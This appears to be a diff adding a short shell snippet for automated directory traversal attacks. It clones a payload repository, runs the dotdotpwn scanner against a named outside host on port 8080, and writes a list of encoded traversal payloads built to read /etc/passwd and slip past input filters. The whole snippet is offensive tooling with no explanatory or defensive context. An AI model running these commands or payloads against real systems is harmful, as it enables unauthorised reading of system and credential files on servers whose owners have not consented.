@@ -1,0 +1,17 @@
+# Automated path traversal
+git clone https://github.com/swisskyrepo/PayloadsAllTheThings
+cd PayloadsAllTheThings/Directory\ Traversal
+
+# dotdotpwn tool
+perl dotdotpwn.pl -m http -h schneckyirl.com -x 8080
+
+# Custom bypass payloads
+cat > traversal_payloads.txt << EOF
+../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..;/..;/..;/etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+EOF
